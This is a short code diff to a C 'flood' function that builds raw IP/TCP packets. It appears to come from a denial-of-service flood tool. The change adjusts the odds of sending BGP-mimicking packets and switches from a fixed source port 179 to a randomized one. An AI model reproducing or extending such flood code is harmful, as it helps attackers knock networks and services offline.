@@ -309,11 +309,11 @@ void *flood(void *par1)
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
 		tcph->seq = htonl(randnum(1000000, 9999999));
 
-		int bpgOrDrd = randnum(0, 2);
+		int bpgOrDrd = randnum(0, 3);
 		int mBox = randnum(0, 1);
 
 		/**
-		 * 1:3 chance to send bgp
+		 * 1:4 chance to send bgp
 		 */
 		if (bpgOrDrd == 0)
 		{
@@ -325,7 +325,7 @@ void *flood(void *par1)
 			{
 				if (randnum(0, 1) == 1)
 				{
-					tcph->source = htons(179);
+					tcph->source = htons(randnum(1024, 65535));
 				}
 				else
 				{
